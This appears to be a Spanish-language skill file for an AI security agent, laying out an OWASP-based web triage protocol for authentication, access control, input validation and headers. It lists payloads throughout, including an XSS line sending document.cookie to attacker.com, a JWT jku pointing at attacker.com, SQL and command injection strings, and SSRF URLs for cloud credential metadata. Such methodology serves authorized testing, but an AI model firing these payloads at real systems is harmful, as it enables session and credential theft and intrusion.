# Skill: Web Triage

**Categoría:** web
**Metodología base:** OWASP Testing Guide v4.2, WSTG-SESS, WSTG-AUTHN, WSTG-AUTHZ, WSTG-INPV
**Cuándo activar:** después de surface-discovery, sobre endpoints P0/P1 identificados

---

## Protocolo

### Fase 1 — Análisis de autenticación (WSTG-AUTHN)

**Mecanismo de autenticación:**
```
¿Qué tipo? JWT / Session cookie / Basic Auth / OAuth2 / API Key
¿Dónde viaja el token? Header Authorization / Cookie / URL param (URL param = ALTO)
¿JWT? Decodificá el header y payload (no la firma):
  - alg: none → CRÍTICO
  - alg: HS256 con secret débil → ALTO
  - exp ausente o muy largo → MEDIO
  - datos sensibles en payload sin cifrar → BAJO/MEDIO
  - kid manipulable → CRÍTICO (CWE-73)
  - jwk/jku sin validar → CRÍTICO
```

**Flujo de login:**
- ¿Enumera usuarios? (respuesta diferente para usuario inexistente vs password incorrecto) → MEDIO (WSTG-AUTHN-04)
- ¿Rate limiting en login? Intentá 5 requests rápidos — ¿responde igual? → MEDIO si no hay límite
- ¿Lockout de cuenta? ¿Cuántos intentos? → registrar política
- ¿Reset de contraseña? ¿Token en URL? ¿Token predecible? → analizar
- **Credential Stuffing Detection:** ¿Hay CAPTCHA? ¿Se activa después de N intentos? ¿Headers revelan intentos fallidos?
- **OAuth Flow Analysis:** ¿redirect_uri validado? ¿state parameter presente? ¿scope manipulation possible?

**Tokens de sesión:**
```
Cookie: session=eyJ...
  Secure flag: ¿presente?          → ausencia = BAJO
  HttpOnly flag: ¿presente?        → ausencia = MEDIO (XSS puede robar sesión)
  SameSite: ¿Strict/Lax/None?     → None sin Secure = MEDIO
  Path: ¿restringido?              → / expone a todos los paths
  Domain: ¿restringido al origen?  → dominio amplio = cookie tossing possible
```

**JWT Attack Vectors (conceptual):**
```
1. Algorithm Confusion: RS256 → HS256 con clave pública
2. None Algorithm: {"alg":"none"} sin firma
3. Key Injection: {"jku":"http://attacker.com/keys.json"}
4. Wildcard kid: {"kid":"../../../etc/passwd"}
5. Claim Manipulation: agregar roles/privilegios no autorizados
→ Documentar vectores identificados, NO explotar sin autorización
```

### Fase 2 — Control de acceso (WSTG-AUTHZ)

**IDOR (Insecure Direct Object Reference):**
```
Identificá endpoints con IDs en la ruta:
  GET /api/users/1234/profile
  GET /api/orders/5678
  GET /documents/report_9012.pdf

Protocolo de validación conceptual:
1. ¿El ID es predecible (numérico secuencial, UUID v1)?
2. ¿El endpoint verifica que el recurso pertenece al usuario autenticado?
3. ¿Qué pasa con IDs negativos, 0, strings, o IDs muy grandes?
4. ¿Hay pagination que filtra por user_id? Probar: ?user_id=OTRO_USUARIO
5. ¿UUIDs son realmente aleatorios? ¿Hay información embebida (timestamp, MAC)?
→ Si el ID es predecible Y no hay validación de ownership → ALTO (CWE-639)

Advanced IDOR Techniques:
- HTTP Method Override: PUT → GET, DELETE → GET
- Content-Type Confusion: JSON → form-urlencoded
- Parameter Pollution: ?id=1234&id=5678 (primero vs segundo)
- Mass Assignment en IDOR: {"user_id": "otro", "data": "..."}
```

**Privilege escalation horizontal/vertical:**
- ¿Hay roles? (user, admin, superadmin) — ¿se validan en cada endpoint?
- ¿Parámetros de rol en el request? (`role=admin` en body o query) → probar manipulación
- ¿Endpoints de admin accesibles sin el rol? → CRÍTICO
- **JWT Role Manipulation:** Agregar claims de rol sin autorización
- **Cookie Tampering:** ¿Roles almacenados en cookies sin firma?
- **API Version Bypass:** ¿/api/v2/admin endpoints sin authz?

**Mass Assignment:**
```
POST /api/users/update
Body: {"name": "Victor", "email": "v@example.com"}
→ Probar agregar: "role": "admin", "is_verified": true, "credits": 99999
→ Si la respuesta refleja los campos extra → ALTO (CWE-915)

Advanced Mass Assignment:
- Nested objects: {"profile.settings.admin": true}
- Prototype Pollution: {"__proto__": {"admin": true}}
- Array injection: {"roles": ["user", "admin"]}
- Shadow properties: {"is_active": null, "_deleted": false}
```

**Broken Function Level Authorization (BFLA):**
```
Endpoints administrativos sin protección:
  DELETE /api/users/123        → ¿requiere admin?
  PUT  /api/config             → ¿accesible sin rol?
  POST /api/admin/impersonate  → ¿sin auditoría?
  GET  /api/internal/debug     → ¿expuesto?
→ CRÍTICO si confirmado (CWE-285)
```

### Fase 3 — Validación de inputs (WSTG-INPV)

**SQL Injection (conceptual, sin tools activos):**
```
Identificar puntos de entrada:
  - Query params: ?id=1, ?search=foo, ?category=electronics
  - Headers: User-Agent, Referer, X-Forwarded-For (a veces llegan a DB)
  - Body JSON: {"username": "admin"}, {"filter": {"name": "test"}}
  - REST paths: /users/1, /products/SQLI-HERE/items

Señales de SQLi potencial (sin ejecutar):
  - Respuesta diferente ante: id=1 vs id=1' vs id=1--
  - Mensajes de error que revelan SQL: "syntax error near 'AND'"
  - Tiempo de respuesta anómalo ante: id=1 AND SLEEP(5)--
  - Error codes: 500 Internal Server Error con inputs especiales
  - WAF bypass detection: %53%45%4C%45%43%54 (URL encoding)

Advanced SQLi Vectors:
  - Second-order: input almacenado y usado después en SQL
  - JSON injection: {"search": "test' OR 1=1--"}
  - LIKE injection: ?search=%' OR 1=1--
  - ORDER BY injection: ?sort=name' AND SLEEP(5)--
  - LIMIT injection: ?limit=1; WAITFOR DELAY '0:0:5'--
  - NoSQL injection: {"$gt": ""}, {"$ne": null}

→ Documentar el vector, NO ejecutar payloads activos sin autorización explícita
```

**XSS (Cross-Site Scripting):**
```
Identificar puntos de reflexión:
  - ¿El input del usuario aparece en el HTML de respuesta?
  - ¿Hay rendering de Markdown o HTML? (rich text editors, comentarios)
  - ¿Respuestas JSON con Content-Type: text/html?
  - ¿DOM-based XSS? (location.hash, document.write, innerHTML)

Verificar sin ejecutar:
  - Input: <script>alert(1)</script>
  - ¿Aparece escapado en respuesta? → correcto
  - ¿Aparece sin escapar? → ALTO (CWE-79)
  - ¿CSP bloquearía ejecución? → revisar header CSP

Advanced XSS Vectors:
  - SVG based: <svg/onload=alert(1)>
  - Event handlers: <img src=x onerror=alert(1)>
  - Data URIs: <iframe src="data:text/html,<script>alert(1)</script>">
  - JSON injection: {"name": "<script>fetch('http://attacker.com/?c='+document.cookie)</script>"}
  - Markdown XSS: [click](javascript:alert(1))
  - Template injection: {{constructor.constructor('return this')().alert(1)}}

DOM-Based XSS Detection:
  - Sinks: document.write(), innerHTML, eval(), setTimeout(string)
  - Sources: location.hash, location.search, document.referrer
  - ¿Hay sanitización? DOMPurify configurado correctamente?
```

**SSRF (Server-Side Request Forgery):**
```
Buscar parámetros que reciben URLs:
  - ?url=, ?redirect=, ?webhook=, ?avatar=, ?import=, ?fetch=
  - Body: {"callback": "https://...", "logo_url": "..."}
  - Headers: X-Original-URL, X-Rewrite-URL

Señal de riesgo: el servidor hace requests salientes basado en input del usuario
→ Potencial acceso a metadata de cloud (169.254.169.254), servicios internos
→ ALTO/CRÍTICO si confirmado (CWE-918)

Advanced SSRF Vectors:
  - DNS rebinding: attacker.com → 169.254.169.254
  - URL parsing bypass: http://127.0.0.1:6379/@attacker.com
  - Protocol smuggling: gopher://, dict://, file://
  - Cloud metadata: 
    * AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
    * GCP: http://metadata.google.internal/computeMetadata/v1/
    * Azure: http://169.254.169.254/metadata/instance
  - Internal services: Redis (6379), MongoDB (27017), Elasticsearch (9200)
  - Blind SSRF: interaction con DNS logger (DNSCanary, Burp Collaborator)
```

**Command Injection:**
```
Buscar parámetros que podrían ejecutar comandos:
  - ?host=, ?ip=, ?domain= (network diagnostics)
  - ?file=, ?path=, ?dir= (file operations)
  - ?convert=, ?process=, ?generate= (image/file processing)

Señales de riesgo:
  - Respuesta incluye output de sistema
  - Delays con inputs como: ; sleep 5, | ping 127.0.0.1
  - Errores que revelan comandos: "Failed to run: ping test' && ls"
  
→ CRÍTICO si confirmado (CWE-78)
```

### Fase 4 — Headers de seguridad

Checklist completo a revisar en cada respuesta:

| Header | Valor esperado | Ausencia/Error |
|--------|----------------|----------------|
| `Content-Security-Policy` | Política estricta sin `unsafe-inline` | MEDIO |
| `X-Frame-Options` | `DENY` o `SAMEORIGIN` | MEDIO (clickjacking) |
| `X-Content-Type-Options` | `nosniff` | BAJO |
| `Strict-Transport-Security` | `max-age≥31536000; includeSubDomains` | BAJO/MEDIO |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | BAJO |
| `Permissions-Policy` | Política explícita | INFORMATIVO |
| `Cache-Control` | `no-store` en endpoints autenticados | BAJO/MEDIO |
| `Cross-Origin-Opener-Policy` | `same-origin` | BAJO |
| `Cross-Origin-Resource-Policy` | `same-origin` | BAJO |
| `Cross-Origin-Embedder-Policy` | `require-corp` | INFORMATIVO |

### Fase 5 — Output

```markdown
## Web Triage — [Target]

### Autenticación
[findings con vectores específicos]

### Control de acceso
[findings con vectores específicos]

### Validación de inputs
[vectores identificados, sin explotar]

### Headers de seguridad
[checklist completado]

### Vectores para investigación adicional
[lista para delegar a security-web o validación autorizada]
```

---

## Anti-patterns

- ❌ Ejecutar payloads SQL/XSS sin autorización explícita para "confirmar"
- ❌ Reportar "posible SQLi" sin identificar el parámetro específico y el comportamiento observable
- ❌ Ignorar los headers — son el 40% de los hallazgos en auditorías web
- ❌ Tratar IDOR como teórico sin verificar si el ID es efectivamente predecible
- ❌ Concluir "no hay XSS" sin revisar DOM sinks y JavaScript client-side
- ❌ Ignorar SSRF blind — ausencia de respuesta no significa ausencia de vulnerabilidad
